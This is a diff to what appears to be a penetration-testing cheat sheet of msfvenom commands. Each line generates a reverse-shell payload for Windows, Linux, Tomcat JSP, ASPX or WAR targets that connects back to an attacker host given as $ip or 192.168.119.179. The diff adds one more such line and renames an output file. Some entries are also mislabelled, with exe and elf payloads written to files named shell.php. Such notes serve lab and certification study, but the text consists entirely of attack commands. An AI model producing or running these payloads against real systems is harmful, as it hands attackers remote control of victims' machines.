@@ -24,11 +24,14 @@ msfvenom -p windows/shell_reverse_tcp LHOST=$lhost LPORT=$lport -f hta-psh -o sh
 # Linux 64 bit PHP
 msfvenom -p linux/x64/shell_reverse_tcp LHOST=$ip LPORT=443 -f elf > shell.php
 
+# Windows PHP
+msfvenom -p windows/shell_reverse_tcp LHOST=$ip LPORT=443 -f exe > shell.php
+
 # Windows 64 bit Apache Tomcat
 msfvenom -p java/jsp_shell_reverse_tcp LHOST=$ip LPORT=80 -f raw > shell.jsp
 
 # Windows 64 bit ASPX
-msfvenom -f aspx -p windows/x64/shell_reverse_tcp LHOST=$ip LPORT=443 -o shell64.aspx
+msfvenom -f aspx -p windows/x64/shell_reverse_tcp LHOST=$ip LPORT=443 -o shell443.aspx
 
 # Apache Tomcat War
 msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.119.179 LPORT=8080 -f war > shell.war
